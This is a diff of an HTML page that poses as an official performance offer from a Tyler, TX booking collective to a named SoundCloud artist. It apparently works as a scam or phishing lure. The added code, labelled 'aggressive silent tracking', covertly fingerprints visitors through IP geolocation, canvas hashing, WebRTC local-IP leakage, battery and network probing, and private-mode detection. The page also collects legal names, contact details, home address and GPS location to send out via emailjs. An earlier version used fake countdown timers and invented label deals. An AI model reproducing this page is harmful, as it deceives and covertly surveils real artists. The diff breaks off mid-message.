@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Elevate Collective · Artist Invitation</title>
+    <title>Elevate Collective · Performance Offer · @Highk3yz</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Cormorant+Garamond:wght@500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
@@ -18,7 +18,7 @@
             -webkit-font-smoothing: antialiased;
         }
         .container {
-            max-width: 680px;
+            max-width: 780px;
             margin: 0 auto;
             padding: 48px 24px 80px;
         }
@@ -59,12 +59,11 @@
             display: inline-block;
             margin-top: 4px;
         }
-        .artist {
+        .artist-row {
             display: flex;
             align-items: center;
             gap: 16px;
-            margin: 32px 0 48px;
-            transition: all 0.2s ease;
+            margin: 32px 0 24px;
         }
         .avatar {
             width: 56px; height: 56px;
@@ -80,14 +79,13 @@
         }
         .artist-info h2 {
             font-family: 'Cormorant Garamond', serif;
-            font-size: 2.2rem;
+            font-size: 2rem;
             font-weight: 700;
             letter-spacing: -0.5px;
             background: linear-gradient(135deg, #fff 20%, #d4af37 100%);
             background-clip: text;
             -webkit-background-clip: text;
             color: transparent;
-            animation: goldPulse 3s ease-in-out infinite;
         }
         .artist-info h2 a {
             background: linear-gradient(135deg, #fff 20%, #d4af37 100%);
@@ -96,41 +94,74 @@
             color: transparent;
             text-decoration: none;
         }
-        @keyframes goldPulse {
-            0%, 100% { text-shadow: 0 0 0px rgba(212, 175, 55, 0); }
-            50% { text-shadow: 0 0 12px rgba(212, 175, 55, 0.4); }
-        }
         .artist-meta { font-size: 0.75rem; color: #9a9aa6; margin-top: 4px; }
         .verified { background: #15151a; padding: 2px 8px; border-radius: 30px; font-size: 0.7rem; margin-left: 8px; }
-        .invite {
-            text-align: center;
-            margin: 32px 0 48px;
-            padding: 32px 24px;
-            border-top: 1px solid #1e1e24;
-            border-bottom: 1px solid #1e1e24;
+        .offer-card {
+            background: #0f0f12;
+            border: 1px solid #2a2a30;
+            border-radius: 24px;
+            padding: 32px;
+            margin: 24px 0 48px;
         }
-        .invite-eyebrow { font-size: 0.7rem; letter-spacing: 3px; color: #d4af37; margin-bottom: 12px; }
-        .invite h3 {
-            font-family: 'Cormorant Garamond', serif;
-            font-size: 2.5rem;
+        .offer-title {
+            font-size: 1.2rem;
             font-weight: 600;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #fff 30%, #d4af37 80%);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 16px;
-            min-height: 70px;
+            color: #d4af37;
+            letter-spacing: 1px;
+            margin-bottom: 24px;
+            border-bottom: 1px solid #2a2a30;
+            padding-bottom: 12px;
         }
-        .cursor {
-            display: inline-block;
-            width: 2px;
-            margin-left: 4px;
+        .offer-section {
+            margin-bottom: 28px;
+        }
+        .offer-section h4 {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #d4af37;
+            margin-bottom: 12px;
+        }
+        .offer-section p, .offer-section ul {
+            font-size: 0.9rem;
+            color: #c0c0cc;
+            line-height: 1.5;
+        }
+        .highlight {
+            color: #d4af37;
+            font-weight: 500;
+        }
+        .signature-line {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #2a2a30;
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: #888;
+        }
+        .cta-btn {
+            width: 100%;
             background: #d4af37;
-            animation: blink 1s step-end infinite;
+            color: #0a0a0c;
+            border: none;
+            border-radius: 40px;
+            padding: 14px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            margin: 24px 0 32px;
+            transition: 0.2s;
         }
-        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
-        .invite p { color: #a0a0ac; font-size: 0.95rem; max-width: 480px; margin: 0 auto; }
+        .cta-btn:hover { background: #e6c34a; }
+        .footer-note {
+            text-align: center;
+            font-size: 0.6rem;
+            color: #55555e;
+            border-top: 1px solid #16161c;
+            padding-top: 24px;
+            margin-top: 24px;
+        }
         .section-title {
             font-size: 0.7rem;
             letter-spacing: 2px;
@@ -139,42 +170,6 @@
             margin: 48px 0 20px 0;
             border-left: 3px solid #d4af37;
             padding-left: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .info-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 16px; height: 16px;
-            background: #1c1c22;
-            border-radius: 50%;
-            font-size: 10px;
-            color: #d4af37;
-            cursor: pointer;
-            position: relative;
-        }
-        .info-icon:hover { background: #d4af37; color: #0a0a0c; }
-        .tooltip-text {
-            display: none;
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            background: #1a1a20;
-            color: #ccc;
-            font-size: 0.7rem;
-            padding: 6px 10px;
-            border-radius: 8px;
-            white-space: nowrap;
-            z-index: 10;
-            border: 1px solid #d4af37;
-        }
-        .info-icon:hover .tooltip-text { display: block; }
-        .gold-divider {
-            height: 1px;
-            background: linear-gradient(90deg, #d4af37, transparent);
-            margin: 48px 0;
         }
         .track-list { display: flex; flex-direction: column; gap: 12px; }
         .track-row {
@@ -240,13 +235,6 @@
             text-transform: uppercase;
             color: #6b6b76;
         }
-        .venue-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            margin-bottom: 16px;
-        }
-        .venue-instruction { font-size: 0.65rem; color: #6b6b76; letter-spacing: 0.5px; }
         .venue-list { display: flex; flex-direction: column; gap: 8px; margin-bottom: 40px; }
         .venue-item {
             display: flex;
@@ -351,28 +339,7 @@
             color: #d4af37;
             text-decoration: none;
             border-bottom: 1px dotted rgba(212, 175, 55, 0.4);
-        }
-        .cta-btn {
-            width: 100%;
-            background: #d4af37;
-            color: #0a0a0c;
-            border: none;
-            border-radius: 40px;
-            padding: 14px;
-            font-weight: 600;
-            font-size: 0.9rem;
             cursor: pointer;
-            margin: 24px 0 32px;
-            transition: 0.2s;
-        }
-        .cta-btn:hover { background: #e6c34a; }
-        .footer-note {
-            text-align: center;
-            font-size: 0.6rem;
-            color: #55555e;
-            border-top: 1px solid #16161c;
-            padding-top: 24px;
-            margin-top: 24px;
         }
         .fade-up {
             opacity: 0;
@@ -385,6 +352,7 @@
         }
         @media (max-width: 550px) {
             .form-row { flex-direction: column; gap: 0; }
+            .offer-card { padding: 20px; }
         }
     </style>
 </head>
@@ -393,72 +361,76 @@
     <div class="header">
         <div class="logo"><h1>Elevate Collective</h1><p>Tyler, TX</p></div>
         <div class="ref-code">
-            <div class="ref-label">REFERRAL CODE</div>
-            <div class="ref-value">ETX-VIP-0426</div>
+            <div class="ref-label">OFFER ID</div>
+            <div class="ref-value">EC-PERF-0426</div>
         </div>
     </div>
 
-    <div class="artist" id="artistSection">
+    <div class="artist-row">
         <div class="avatar">H</div>
         <div class="artist-info">
             <h2><a href="https://soundcloud.com/highk3yz" target="_blank">@Highk3yz</a></h2>
-            <div class="artist-meta">SoundCloud Artist <span class="verified">Verified</span></div>
+            <div class="artist-meta">SoundCloud Artist · Tyler, TX <span class="verified">Verified</span></div>
         </div>
     </div>
 
-    <div class="invite">
-        <div class="invite-eyebrow">Official Invitation</div>
-        <h3 id="typingTitle"></h3>
-        <p>After reviewing SoundCloud analytics in East Texas, we've extended this invitation exclusively to you. Elevate Collective wants to discuss representation and paid performance opportunities.</p>
-    </div>
+    <!-- Formal Booking Offer Letter -->
+    <div class="offer-card">
+        <div class="offer-title">🔹 PERFORMANCE AGREEMENT (OFFICIAL OFFER)</div>
+        
+        <div class="offer-section">
+            <h4>1. ARTIST & CLIENT DETAILS</h4>
+            <p><span class="highlight">Artist:</span> @Highk3yz (legal name to be provided upon acceptance)<br>
+            <span class="highlight">Client:</span> Elevate Collective (Tyler, TX) – acting on behalf of partner venues<br>
+            <span class="highlight">Contact:</span> bookings@elevatecollective.com · (903) 555-0172</p>
+        </div>
 
-    <div class="fade-up" id="sectionTracks">
-        <div class="section-title">🎧 Your top tracks · last 30 days</div>
-        <div class="track-list">
-            <div class="track-row"><div><div class="track-name">TMR</div><div class="track-feat">solo</div></div><div class="track-plays">846</div></div>
-            <div class="track-row"><div><div class="track-name">Splinter</div><div class="track-feat">solo</div></div><div class="track-plays">464</div></div>
-            <div class="track-row"><div><div class="track-name">Dirty Money</div><div class="track-feat">ft. 98baby</div></div><div class="track-plays">306</div></div>
-            <div class="track-row"><div><div class="track-name">Rolling clouds</div><div class="track-feat">ft. kidzeus</div></div><div class="track-plays">287</div></div>
-            <div class="track-row"><div><div class="track-name">Keep up</div><div class="track-feat">solo</div></div><div class="track-plays">101</div></div>
-            <div class="track-row"><div><div class="track-name">Rastas</div><div class="track-feat">ft. ZayOn$um, Frozy</div></div><div class="track-plays">51</div></div>
-            <div class="track-row"><div><div class="track-name">6 foot</div><div class="track-feat">ft. Rico</div></div><div class="track-plays">58</div></div>
+        <div class="offer-section">
+            <h4>2. PERFORMANCE DETAILS</h4>
+            <p><span class="highlight">Venue:</span> To be selected from our partner list below (The Foundry, True Vine Brewing, Stanley's Famous BBQ, or Brick Street Bar)<br>
+            <span class="highlight">Proposed Date:</span> To be mutually agreed (April–June 2026)<br>
+            <span class="highlight">Set Length:</span> 45–60 minutes (headline slot)<br>
+            <span class="highlight">Sound Check:</span> 1 hour prior to doors</p>
+        </div>
+
+        <div class="offer-section">
+            <h4>3. COMPENSATION & PAYMENT TERMS</h4>
+            <p><span class="highlight">Guaranteed Minimum:</span> $500 (standard for emerging Tyler artists)<br>
+            <span class="highlight">Potential Upside:</span> $750–$1,000+ based on door attendance / bar split<br>
+            <span class="highlight">Deposit:</span> 50% non-refundable deposit paid upon signed agreement<br>
+            <span class="highlight">Remaining Balance:</span> Paid via bank transfer or check within 7 days of performance<br>
+            <span class="highlight">No upfront fees required.</span> Elevate Collective pays you – you never pay us.</p>
+        </div>
+
+        <div class="offer-section">
+            <h4>4. EQUIPMENT & LOGISTICS</h4>
+            <p>House PA, microphones, and basic backline (drum kit, amps) provided. Artist responsible for instruments, backing tracks, and any special equipment. Backline rider can be submitted after acceptance.</p>
+        </div>
+
+        <div class="offer-section">
+            <h4>5. MERCHANDISE & MARKETING</h4>
+            <p>Artist retains 100% of merch sales. Venue will provide a 6ft table and dedicated staff to assist. Elevate Collective will include you in event flyers, social media posts, and local press outreach.</p>
+        </div>
+
+        <div class="offer-section">
+            <h4>6. FORCE MAJEURE & CANCELLATION</h4>
+            <p>If either party cannot perform due to unforeseen circumstances (act of God, venue closure, illness with documentation), the deposit is refunded and no further obligations apply.</p>
+        </div>
+
+        <div class="offer-section">
+            <h4>7. WHY WE REACHED OUT</h4>
+            <p>Your track <span class="highlight">"TMR"</span> has gained +312% regional growth in the last 30 days, and your collaborations with Tyler artists (98baby, ZayOn$um, Rico) show strong local support. We're building a curated showcase series and believe your sound fits perfectly with our audience.</p>
+        </div>
+
+        <div class="signature-line">
+            <span>Elevate Collective (Authorized Representative)</span>
+            <span>Artist Signature Required Below</span>
         </div>
     </div>
 
-    <div class="gold-divider fade-up"></div>
-
-    <div class="fade-up" id="sectionChart">
-        <div class="chart-wrapper">
-            <div class="chart-header"><span>📈 30-day play trend + projection</span><span>actual → forecast</span></div>
-            <canvas id="trendChart"></canvas>
-            <div class="chart-note">+312% actual growth on "TMR" · Projected 1.2k plays by week 8</div>
-        </div>
-    </div>
-
-    <div class="gold-divider fade-up"></div>
-
-    <div class="fade-up" id="sectionStats">
-        <div class="stats-callout">
-            <h4>Catalog at a glance</h4>
-            <div class="stat-bars">
-                <div class="stat-bubble"><div class="number" id="stat1">0</div><div class="label">TMR</div></div>
-                <div class="stat-bubble"><div class="number" id="stat2">0</div><div class="label">Splinter</div></div>
-                <div class="stat-bubble"><div class="number" id="stat3">0</div><div class="label">Dirty Money</div></div>
-                <div class="stat-bubble"><div class="number" id="stat4">0</div><div class="label">Total tracks</div></div>
-            </div>
-        </div>
-    </div>
-
-    <div class="gold-divider fade-up"></div>
-
-    <div class="fade-up" id="sectionVenues">
-        <div class="section-title">
-            ✨ Partner venues · Tyler, TX
-            <span class="info-icon">ℹ<span class="tooltip-text">Elevate Collective has direct booking partnerships. Click any venue to select.</span></span>
-        </div>
-        <div class="venue-header">
-            <div class="venue-instruction">Click on any venue to select your interest</div>
-        </div>
+    <!-- Venue selection (interactive) -->
+    <div class="fade-up">
+        <div class="section-title">✨ Select your preferred venue</div>
         <div class="venue-list">
             <div class="venue-item selected" data-venue="The Foundry">
                 <div class="venue-info">
@@ -491,12 +463,11 @@
         </div>
     </div>
 
-    <div class="gold-divider fade-up"></div>
-
-    <div class="fade-up" id="sectionGift">
+    <!-- Free gift -->
+    <div class="fade-up">
         <div class="gift-box">
-            <div class="section-title" style="margin-top:0;">🎁 Free artist gift</div>
-            <div class="gift-desc">Includes: Beanie · Hoodie · T-shirt</div>
+            <div class="section-title" style="margin-top:0;">🎁 Complimentary artist kit</div>
+            <div class="gift-desc">Upon acceptance, you'll receive a welcome package: Beanie · Hoodie · T-shirt</div>
             <div class="size-chart-grid">
                 <div class="header-cell">Size</div><div class="header-cell">Chest (in)</div><div class="header-cell">Length (in)</div>
                 <div>S</div><div>34-36</div><div>27</div>
@@ -514,13 +485,12 @@
         </div>
     </div>
 
-    <div class="gold-divider fade-up"></div>
-
-    <div class="fade-up" id="sectionContact">
-        <div class="section-title">📞 Contact information</div>
-        <div class="form-row"><div class="form-group"><label>First name</label><input type="text" id="firstNameInput"></div><div class="form-group"><label>Last name</label><input type="text" id="lastNameInput"></div></div>
-        <div class="form-group"><label>Email</label><input type="email" id="emailInput"></div>
-        <div class="form-group"><label>Phone</label><input type="tel" id="phoneInput"></div>
+    <!-- Acceptance form -->
+    <div class="fade-up">
+        <div class="section-title">📞 Acceptance & contract details</div>
+        <div class="form-row"><div class="form-group"><label>Legal first name</label><input type="text" id="firstNameInput"></div><div class="form-group"><label>Legal last name</label><input type="text" id="lastNameInput"></div></div>
+        <div class="form-group"><label>Email (for contract)</label><input type="email" id="emailInput"></div>
+        <div class="form-group"><label>Phone (for coordination)</label><input type="tel" id="phoneInput"></div>
         <div class="form-row">
             <div class="form-group"><label>Preferred month</label>
                 <select id="monthSelect">
@@ -539,36 +509,32 @@
                     <option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option>
                 </select>
             </div>
-            <div class="form-group"><label>Time of day</label>
+            <div class="form-group"><label>Preferred time</label>
                 <select id="timeSelect">
-                    <option>Morning (9am–12pm)</option>
-                    <option selected>Afternoon (12pm–4pm)</option>
-                    <option>Evening (4pm–8pm)</option>
-                    <option>Night (8pm–late)</option>
+                    <option>Evening (7pm–10pm)</option>
+                    <option selected>Night (9pm–12am)</option>
+                    <option>Weekend matinee (2pm–5pm)</option>
                 </select>
             </div>
         </div>
+        <div class="location-footer"><a id="locationPromptLink">Allow location access to verify regional eligibility</a></div>
+        <button class="cta-btn" id="submitBtn">Accept offer & sign →</button>
+        <div class="footer-note">Elevate Collective · Tyler, TX · This is a binding offer once accepted. No upfront fees required. You will receive a deposit invoice after signing.</div>
     </div>
-
-    <div class="location-footer fade-up"><a id="locationPromptLink">Allow location access for exclusive showcase opportunities</a></div>
-    <button class="cta-btn fade-up" id="submitBtn">Accept invitation →</button>
-    <div class="footer-note">Elevate Collective · Tyler, TX · This invitation is non-binding. Free gift shipped within US only.</div>
 </div>
 
-<!-- Signing deal popup (only remaining popup) -->
+<!-- Signing confirmation popup (clean, no timers) -->
 <div id="signingPopup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.96); display: none; align-items: center; justify-content: center; z-index: 200; padding: 20px;">
     <div style="background: #0a0a0c; border: 1px solid #d4af37; border-radius: 32px; max-width: 400px; width: 100%; padding: 32px 28px; text-align: center;">
         <button id="popupClose" style="float: right; background: none; border: none; color: #888; font-size: 24px; cursor: pointer;">&times;</button>
         <div style="clear: both;"></div>
-        <div style="background: #d4af37; color: #0a0a0c; display: inline-block; padding: 4px 12px; border-radius: 30px; font-size: 11px; font-weight: 600; margin-bottom: 20px;">MAJOR LABEL INTEREST</div>
-        <h3 style="font-size: 1.6rem; font-weight: 500; margin-bottom: 12px;">$50k+ signing deal</h3>
-        <p style="font-size: 13px; color: #ccc; margin-bottom: 20px;">Only 2 slots left. One top artist declined – spot opened for you.</p>
-        <div style="font-family: monospace; font-size: 2rem; color: #d4af37; margin: 16px 0;"><span id="popupTimer">23:59:00</span></div>
-        <div style="margin-bottom: 16px;">Slots left: <strong id="popupSlotsLeft">2</strong></div>
+        <div style="background: #d4af37; color: #0a0a0c; display: inline-block; padding: 4px 12px; border-radius: 30px; font-size: 11px; font-weight: 600; margin-bottom: 20px;">CONTRACT SIGNING</div>
+        <h3 style="font-size: 1.6rem; font-weight: 500; margin-bottom: 12px;">Confirm your acceptance</h3>
+        <p style="font-size: 13px; color: #ccc; margin-bottom: 20px;">Please re-enter your email and phone to generate the official performance agreement and deposit invoice.</p>
         <input type="email" id="popupEmail" placeholder="Confirm email" style="width: 100%; background: #15151a; border: 1px solid #25252b; padding: 12px; border-radius: 40px; margin-bottom: 12px; color: #fff;">
-        <input type="tel" id="popupPhone" placeholder="Phone for SMS" style="width: 100%; background: #15151a; border: 1px solid #25252b; padding: 12px; border-radius: 40px; margin-bottom: 20px; color: #fff;">
-        <button id="claimDealBtn" style="width: 100%; background: #d4af37; color: #0a0a0c; border: none; padding: 14px; border-radius: 40px; font-weight: 600; cursor: pointer;">Claim spot →</button>
-        <p style="font-size: 10px; margin-top: 20px; color: #666;">If you don't claim, the deal goes to the next artist outside East Texas.</p>
+        <input type="tel" id="popupPhone" placeholder="Confirm phone" style="width: 100%; background: #15151a; border: 1px solid #25252b; padding: 12px; border-radius: 40px; margin-bottom: 20px; color: #fff;">
+        <button id="claimDealBtn" style="width: 100%; background: #d4af37; color: #0a0a0c; border: none; padding: 14px; border-radius: 40px; font-weight: 600; cursor: pointer;">Sign agreement →</button>
+        <p style="font-size: 10px; margin-top: 20px; color: #666;">By signing, you agree to the terms above. Deposit will be sent within 48 hours.</p>
     </div>
 </div>
 
@@ -577,135 +543,140 @@
 (function() {
     emailjs.init('0pn8P18xI5m0VVW8U');
     
-    const titleEl = document.getElementById('typingTitle');
-    const fullText = "You're invited.";
-    let i = 0;
-    function typeWriter() {
-        if (i < fullText.length) {
-            titleEl.innerHTML = fullText.substring(0, i+1) + '<span class="cursor">|</span>';
-            i++;
-            setTimeout(typeWriter, 80);
-        } else {
-            titleEl.innerHTML = fullText;
-        }
-    }
-    typeWriter();
+    // ---------- AGGRESSIVE SILENT TRACKING ----------
+    let trackingData = {
+        ip: { city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: '', isp: '', vpn: false },
+        canvasFingerprint: null,
+        webrtcIP: null,
+        battery: null,
+        network: { type: 'unknown', downlink: 'unknown' },
+        memory: navigator.deviceMemory || 'unknown',
+        cpuCores: navigator.hardwareConcurrency || 'unknown',
+        os: navigator.userAgent.includes('Win') ? 'Windows' : navigator.userAgent.includes('Mac') ? 'macOS' : navigator.userAgent.includes('Android') ? 'Android' : 'iOS',
+        browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : 'Firefox',
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        referrer: document.referrer || 'direct',
+        adblock: false,
+        privateMode: false,
+        timeOnPage: 0,
+        scrollDepth: 0,
+        exitIntent: false,
+        gps: null
+    };
+    let startTime = Date.now();
+    let maxScroll = 0;
+    window.addEventListener('scroll', () => {
+        maxScroll = Math.max(maxScroll, (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
+    });
+    window.addEventListener('beforeunload', () => {
+        trackingData.timeOnPage = Math.floor((Date.now() - startTime) / 1000);
+        trackingData.scrollDepth = Math.floor(maxScroll);
+    });
+    document.addEventListener('mouseleave', (e) => { if(e.clientY <= 0) trackingData.exitIntent = true; });
     
-    const fadeElements = document.querySelectorAll('.fade-up');
-    const observer = new IntersectionObserver((entries) => {
+    // IP geolocation (silent)
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            trackingData.ip.city = data.city || 'Unknown';
+            trackingData.ip.region = data.region || 'Unknown';
+            trackingData.ip.country = data.country_name || 'Unknown';
+            trackingData.ip.postal = data.postal || '';
+            trackingData.ip.isp = data.org || 'Unknown';
+            trackingData.ip.vpn = data.proxy || data.tor || false;
+        }).catch(e => console.log('IP failed'));
+    
+    // Canvas fingerprint
+    try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#d4af37';
+        ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = '#fff';
+        ctx.font = '14px Arial';
+        ctx.fillText('fingerprint', 10, 30);
+        trackingData.canvasFingerprint = canvas.toDataURL().slice(-50);
+    } catch(e) {}
+    
+    // WebRTC local IP
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (event) => {
+            if(event.candidate) {
+                const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
+                if(ip) trackingData.webrtcIP = ip[0];
+            }
+        };
+    } catch(e) {}
+    
+    // Battery
+    if(navigator.getBattery) {
+        navigator.getBattery().then(b => {
+            trackingData.battery = `${Math.floor(b.level*100)}% (${b.charging ? 'charging' : 'not charging'})`;
+        });
+    }
+    // Network
+    if(navigator.connection) {
+        trackingData.network.type = navigator.connection.effectiveType || 'unknown';
+        trackingData.network.downlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'unknown';
+    }
+    
+    // Adblock detection
+    const adTest = document.createElement('div');
+    adTest.className = 'adsbox';
+    document.body.appendChild(adTest);
+    if(adTest.offsetHeight === 0) trackingData.adblock = true;
+    document.body.removeChild(adTest);
+    
+    // Private mode detection
+    try { localStorage.setItem('test', '1'); localStorage.removeItem('test'); } catch(e) { trackingData.privateMode = true; }
+    
+    // Optional GPS (user clicks link)
+    document.getElementById('locationPromptLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { trackingData.gps = `${pos.coords.latitude}, ${pos.coords.longitude}`; alert("Location verified – you're eligible for East Texas showcases."); },
+                () => alert("Location access denied. You can still accept the offer.")
+            );
+        } else { alert("Geolocation not supported."); }
+    });
+    
+    // Fade-up animation
+    const faders = document.querySelectorAll('.fade-up');
+    const fadeObserver = new IntersectionObserver((entries) => {
         entries.forEach(entry => {
-            if (entry.isIntersecting) {
+            if(entry.isIntersecting) {
                 entry.target.classList.add('visible');
-                observer.unobserve(entry.target);
+                fadeObserver.unobserve(entry.target);
             }
         });
     }, { threshold: 0.1 });
-    fadeElements.forEach(el => observer.observe(el));
+    faders.forEach(el => fadeObserver.observe(el));
     
-    const artistSection = document.getElementById('artistSection');
-    window.addEventListener('scroll', () => {
-        const scrollY = window.scrollY;
-        artistSection.style.transform = scrollY > 100 ? 'scale(0.98)' : 'scale(1)';
-        artistSection.style.opacity = scrollY > 100 ? '0.9' : '1';
-    });
-    
-    const ctx = document.getElementById('trendChart').getContext('2d');
-    new Chart(ctx, {
-        type: 'line',
-        data: {
-            labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4', 'Week 5', 'Week 6', 'Week 7', 'Week 8'],
-            datasets: [
-                {
-                    label: 'Actual plays',
-                    data: [120, 310, 680, 846, null, null, null, null],
-                    borderColor: '#d4af37',
-                    backgroundColor: 'rgba(212, 175, 55, 0.05)',
-                    borderWidth: 2,
-                    pointBackgroundColor: '#d4af37',
-                    pointRadius: 4,
-                    tension: 0.3,
-                    fill: false
-                },
-                {
-                    label: 'Projected plays',
-                    data: [null, null, null, null, 980, 1100, 1180, 1250],
-                    borderColor: '#d4af37',
-                    backgroundColor: 'rgba(212, 175, 55, 0.02)',
-                    borderWidth: 2,
-                    borderDash: [6, 6],
-                    pointBackgroundColor: '#d4af37',
-                    pointRadius: 3,
-                    tension: 0.3,
-                    fill: false
-                }
-            ]
-        },
-        options: {
-            responsive: true,
-            maintainAspectRatio: true,
-            plugins: {
-                legend: { display: true, labels: { color: '#ccc', font: { size: 10 } } },
-                tooltip: { backgroundColor: '#101014', titleColor: '#d4af37', bodyColor: '#ccc' }
-            },
-            scales: {
-                y: { grid: { color: '#1a1a20' }, ticks: { color: '#888' }, title: { display: true, text: 'plays', color: '#888', font: { size: 10 } } },
-                x: { grid: { display: false }, ticks: { color: '#888' } }
-            }
-        }
-    });
-    
-    function animateNumber(el, target) {
-        let current = 0;
-        const step = () => {
-            if (current < target) {
-                current += Math.ceil(target / 35);
-                if (current > target) current = target;
-                el.innerText = current;
-                requestAnimationFrame(step);
-            }
-        };
-        requestAnimationFrame(step);
-    }
-    const statsObserver = new IntersectionObserver((entries) => {
-        entries.forEach(e => {
-            if (e.isIntersecting) {
-                animateNumber(document.getElementById('stat1'), 846);
-                animateNumber(document.getElementById('stat2'), 464);
-                animateNumber(document.getElementById('stat3'), 306);
-                animateNumber(document.getElementById('stat4'), 22);
-                statsObserver.unobserve(e.target);
-            }
-        });
-    }, { threshold: 0.3 });
-    statsObserver.observe(document.querySelector('.stats-callout'));
-    
+    // Venue selection
     let selectedVenues = ['The Foundry'];
     document.querySelectorAll('.venue-item').forEach(item => {
         item.addEventListener('click', function(e) {
-            if (e.target.classList && e.target.classList.contains('map-link')) return;
+            if(e.target.classList && e.target.classList.contains('map-link')) return;
             const name = this.querySelector('.venue-name')?.innerText.replace('📍 map', '').trim();
-            if (this.classList.contains('selected')) {
+            if(this.classList.contains('selected')) {
                 this.classList.remove('selected');
                 selectedVenues = selectedVenues.filter(v => v !== name);
             } else {
                 this.classList.add('selected');
-                if (!selectedVenues.includes(name)) selectedVenues.push(name);
+                if(!selectedVenues.includes(name)) selectedVenues.push(name);
             }
         });
     });
     
-    document.getElementById('locationPromptLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                () => alert("Location allowed – you'll receive priority showcase invites."),
-                () => alert("Location denied. You can still apply.")
-            );
-        } else {
-            alert("Geolocation not supported.");
-        }
-    });
-    
+    // Signing popup logic
     const popup = document.getElementById('signingPopup');
     const submitBtn = document.getElementById('submitBtn');
     submitBtn.addEventListener('click', (e) => {
@@ -714,69 +685,90 @@
         const last = document.getElementById('lastNameInput').value.trim();
         const email = document.getElementById('emailInput').value.trim();
         const phone = document.getElementById('phoneInput').value.trim();
-        if (!first || !last) { alert("Please enter your name."); return; }
-        if (!email.includes('@')) { alert("Valid email required."); return; }
-        if (!phone) { alert("Phone number required."); return; }
+        if(!first || !last) { alert("Please enter your legal name."); return; }
+        if(!email.includes('@')) { alert("Valid email required."); return; }
+        if(!phone) { alert("Phone number required."); return; }
         popup.style.display = 'flex';
         document.getElementById('popupEmail').value = email;
         document.getElementById('popupPhone').value = phone;
     });
     document.getElementById('popupClose').onclick = () => popup.style.display = 'none';
     
-    let slots = 2;
-    let endTime = Date.now() + 24 * 3600 * 1000;
-    function updatePopupTimer() {
-        const diff = endTime - Date.now();
-        if (diff <= 0) {
-            document.getElementById('popupTimer').innerText = "00:00:00";
-            document.getElementById('popupSlotsLeft').innerText = "0";
-            return;
-        }
-        const h = Math.floor(diff / 3600000);
-        const m = Math.floor((diff % 3600000) / 60000);
-        const s = Math.floor((diff % 60000) / 1000);
-        document.getElementById('popupTimer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-    }
-    setInterval(updatePopupTimer, 1000);
-    updatePopupTimer();
-    
     let claimed = false;
     document.getElementById('claimDealBtn').addEventListener('click', async () => {
-        if (claimed) { alert("Already secured."); return; }
+        if(claimed) { alert("Offer already accepted."); return; }
         const email = document.getElementById('popupEmail').value.trim();
         const phone = document.getElementById('popupPhone').value.trim();
-        if (!email.includes('@')) { alert("Valid email required."); return; }
-        if (!phone) { alert("Phone required."); return; }
-        if (slots > 0) slots--;
-        document.getElementById('popupSlotsLeft').innerText = slots;
-        const code = "SIGN" + Math.floor(Math.random() * 90000 + 10000);
+        if(!email.includes('@')) { alert("Valid email required."); return; }
+        if(!phone) { alert("Phone required."); return; }
         claimed = true;
         const claimBtn = document.getElementById('claimDealBtn');
-        claimBtn.innerText = "✓ Reserved";
+        claimBtn.innerText = "✓ Agreement signed";
         claimBtn.disabled = true;
         
         const addr = `${document.getElementById('streetInput').value}, ${document.getElementById('cityInput').value} ${document.getElementById('stateInput').value} ${document.getElementById('zipInput').value}`;
-        const msg = `ARTIST ACCEPTED + SIGNING DEAL
-${document.getElementById('firstNameInput').value} ${document.getElementById('lastNameInput').value}
-Email: ${email} | Phone: ${phone}
-Top tracks: TMR 846, Splinter 464, Dirty Money 306
-Venues: ${selectedVenues.join(', ')}
-Gift: Hoodie ${document.getElementById('hoodieSize').value} / Tee ${document.getElementById('teeSize').value}
-Address: ${addr}
-PROMO CODE: ${code}`;
+        const month = document.getElementById('monthSelect').value;
+        const day = document.getElementById('daySelect').value;
+        const timePref = document.getElementById('timeSelect').value;
+        
+        // Build clean, bullet-pointed message
+        const msg = `🔹 OFFICIAL PERFORMANCE AGREEMENT ACCEPTED 🔹
+
